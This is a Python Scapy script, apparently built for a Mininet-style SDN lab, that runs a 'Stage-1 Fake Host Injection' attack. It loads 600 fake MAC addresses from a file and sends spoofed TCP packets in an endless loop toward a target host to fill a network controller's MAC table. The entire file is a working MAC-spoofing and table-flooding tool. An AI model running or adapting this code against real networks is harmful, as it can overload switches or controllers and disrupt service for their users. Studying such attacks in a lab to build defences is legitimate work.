#!/usr/bin/env python3

from scapy.all import Ether, IP, TCP, sendp
import random
import time
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MAC_FILE = os.path.join(SCRIPT_DIR, "fake_macs.txt")

ATTACK_INTERFACE = "h1-eth0"
TARGET_MAC = "00:00:00:00:00:02"
TARGET_IP = "10.0.0.2"
PACKETS_PER_SECOND = 100


def load_macs_from_file(filename):
    if not os.path.exists(filename):
        print(f"[ERROR] File not found: {filename}")
        print(f"[INFO] Current directory: {os.getcwd()}")
        print(f"[INFO] Script directory: {SCRIPT_DIR}")
        print(f"[INFO] Looking for: {filename}")
        return []

    with open(filename, "r") as f:
        macs = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(macs)} MACs from {filename}")
    if macs:
        print(f"[*] Sample: {macs[:3]}...")
    return macs


def main():
    print("[*] Stage-1 Fake Host Injection Started")
    print(f"[*] Target: {TARGET_MAC} (h2)")
    print(f"[*] Reading MACs from: {MAC_FILE}")

    fake_macs = load_macs_from_file(MAC_FILE)
    if not fake_macs:
        return

    packets = []
    for fake_mac in fake_macs:
        pkt = Ether(src=fake_mac, dst=TARGET_MAC)
        pkt = pkt / IP(src="10.0.0.99", dst=TARGET_IP)
        pkt = pkt / TCP(dport=80, sport=random.randint(1024, 65535))
        packets.append(pkt)

    print(f"[*] Created {len(packets)} packets")
    print("[*] Starting injection... Press Ctrl+C to stop")
    print("[*] Controller MAC table will show all 600 MACs")

    packet_counter = 0
    start_time = time.time()
    cycle_count = 0

    try:
        while True:
            for pkt in packets:
                sendp(pkt, iface=ATTACK_INTERFACE, verbose=False)
                packet_counter += 1

                if packet_counter % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_counter / elapsed if elapsed > 0 else 0
                    print(f"[+] Sent {packet_counter} packets | Rate: {rate:.1f} pkt/s")

                time.sleep(1.0 / PACKETS_PER_SECOND)

            cycle_count += 1
            print(f"[*] Completed cycle {cycle_count} - Injected all {len(fake_macs)} MACs")

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[*] Attack stopped")
        print(f"[*] Total packets sent: {packet_counter}")
        print(f"[*] Duration: {elapsed:.1f} seconds")
        print(f"[*] Average rate: {packet_counter/elapsed:.1f} pkt/s")
        print(f"[*] Controller MAC table should have {len(fake_macs)} entries")


if __name__ == "__main__":
    main()
